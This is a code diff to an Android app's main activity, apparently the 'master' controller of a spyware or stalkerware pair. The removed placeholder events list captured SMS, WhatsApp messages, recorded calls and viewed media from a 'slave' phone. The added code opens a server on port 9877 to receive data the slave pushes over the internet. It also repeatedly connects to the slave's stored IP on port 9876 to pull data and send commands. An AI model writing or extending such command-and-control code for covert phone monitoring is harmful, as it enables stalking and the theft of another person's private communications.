@@ -1,27 +1,91 @@
 package io.notrack.master;
 
 import android.os.Bundle;
+import android.os.Handler;
+import android.widget.EditText;
 import android.widget.ListView;
 import android.widget.ArrayAdapter;
 import android.widget.Button;
+import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.ServerSocket;
+import java.net.Socket;
 import java.util.ArrayList;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 public class MainActivity extends AppCompatActivity {
     private ListView list;
     private ArrayList<String> events = new ArrayList<>();
+    private ExecutorService pool = Executors.newCachedThreadPool();
+    private Handler h = new Handler();
+    private TextView status;
+    private ServerSocket serverSocket;
+    private boolean running = true;
 
     @Override
     protected void onCreate(Bundle s) {
         super.onCreate(s);
         setContentView(R.layout.activity_master);
         list = findViewById(R.id.list);
-        events.add("Slave connected");
-        events.add("SMS received: 'Hello there'");
-        events.add("WhatsApp message captured");
-        events.add("Call recorded (3m 22s)");
-        events.add("Media viewed: photo.jpg");
+        status = findViewById(R.id.status);
         ArrayAdapter<String> a = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, events);
         list.setAdapter(a);
+        events.add("Master server started on port 9877");
+        a.notifyDataSetChanged();
+
+        // Master = also a server. Opens port 9877 on THIS phone. Slave pushes data here over internet.
+        pool.execute(() -> {
+            try {
+                serverSocket = new ServerSocket(9877);
+                status("Master listening on port 9877");
+                while (running) {
+                    Socket s = serverSocket.accept();
+                    pool.execute(() -> handleSlave(s));
+                }
+            } catch (Exception e) { status("Error: " + e.getMessage()); }
+        });
+
+        // Master also connects TO the slave (port 9876) to pull data and send commands
+        pool.execute(() -> {
+            while (running) {
+                try {
+                    String slaveIp = getSharedPreferences("master", 0).getString("slave_ip", "127.0.0.1");
+                    Socket s = new Socket(slaveIp, 9876);
+                    events.add("Connected to slave");
+                    h.post(() -> { ArrayAdapter<String> a2 = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, events); list.setAdapter(a2); });
+                    s.close();
+                } catch (Exception e) {
+                    // Slave not reachable yet — keep trying every 5s
+                    try { Thread.sleep(5000); } catch (Exception ex) {}
+                }
+            }
+        });
+    }
+
+    private void handleSlave(Socket s) {
+        try {
+            BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
+            PrintWriter out = new PrintWriter(s.getOutputStream(), true);
+            String line;
+            while ((line = in.readLine()) != null) {
+                if (line.equals("BYE")) break;
+                events.add("From slave: " + line);
+                h.post(() -> {
+                    ArrayAdapter<String> a = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, events);
+                    list.setAdapter(a);
+                });
+                out.println("OK");
+            }
+        } catch (Exception e) {} finally {
+            try { s.close(); } catch (Exception e) {}
+        }
+    }
+
+    private void status(String t) {
+        h.post(() -> status.setText(t));
     }
 }
